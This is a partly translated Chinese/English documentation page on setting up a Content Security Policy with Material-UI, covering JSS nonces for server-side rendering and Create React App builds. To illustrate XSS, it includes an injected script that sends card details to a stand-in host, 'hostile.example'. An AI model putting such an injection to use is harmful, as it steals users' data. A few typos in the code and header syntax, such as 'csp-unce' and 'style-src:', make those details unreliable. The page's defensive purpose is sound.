# 内容安全策略（CSP）

<p class="description">This section covers the details of setting up a CSP.</p>

## 什么是 CSP，为什么它有用？

CSP mitigates cross-site scripting (XSS) attacks by requiring developers to whitelist the sources their assets are retrieved from. 此列表作为服务器的头部（heade）返回。 例如，假设您有一个托管在 `https://example.com` 的网站 CSP 头部 `default-src：'self';` 将仅加载 `https://example.com/*` 的所有资源，并否认所有其他人。 如果您的网站的某个部分容易受到 XSS 的影响而未显示未转义的用户输入，则攻击者可以输入以下内容：

```html
<script>
  sendCreditCardDetails('https://hostile.example');
</script>
```

此漏洞允许攻击者执行任何操作。 但是，若使用安全的 CSP 头部，浏览器将不会加载此脚本。

您可以在 [MDN Web Docs](https://developer.mozilla.org/en-US/docs/Web/HTTP/CSP) 阅读有关 CSP 的更多信息。

## 如何实现CSP？

### Server-Side Rendering (SSR)

To use CSP with Material-UI (and JSS), you need to use a nonce. 随机数是一个随机生成的字符串，只使用一次，因此您需要添加服务器中间件以在每个请求上生成一个。 关于如何使用 Express 和 React Helmet 来实现，JSS 有一个[很棒的教程](https://github.com/cssinjs/jss/blob/master/docs/csp.md)。 关于一些基本的纲要，请继续阅读。

CSP nonce 是一个 Base 64 编码的字符串。 你可以生成这样一个：

```js
import uuidv4 from 'uuid/v4';

const nonce = new Buffer(uuidv4()).toString('base64');
```

You must use UUID version 4, as it generates an **unpredictable** string. 接下来您可以将此随机数应用于 CSP 头部。 应用了随机数时，CSP 头部可能看起来像这样：

```js
header('Content-Security-Policy').set(
  `default-src 'self'; style-src: 'self' 'nonce-${nonce}';`,
);
```

You should pass the nonce in the `<style>` tag on the server.

```jsx
<style
  id="jss-server-side"
  nonce={nonce}
  dangerouslySetInnerHTML={{
    __html: sheets.toString(),
  }}
/>
```

然后，您必须将此随机数传递给 JSS ，以便将其添加到后续 `<style>` 标记中。

这样的原理是通过将 `<meta property="csp-nonce" content={nonce} />` 标签传递到 HTML 的 `<head>` 中。 然后，通常情况下，JSS 寻找一个 `<meta property="csp-unce"` 标签，并使用 `content` 的值作为随机数。

下面是一个虚拟的头部（header）可以看起来的示例：

```html
<head>
  <meta property="csp-nonce" content="this-is-a-nonce-123" />
</head>
```

### Create React App (CRA)

According to the [Create React App Docs](https://create-react-app.dev/docs/advanced-configuration/), a Create React App will dynamically embed the runtime script into index.html during the production build by default. This will require a new hash to be set in your CSP during each deployment.

To use a CSP with a project initialized as a Create React App, you will need to set the `INLINE_RUNTIME_CHUNK=false` variable in the `.env` file used for your production build. This will import the runtime script as usual instead of embedding it, avoiding the need to set a new hash during each deployment.
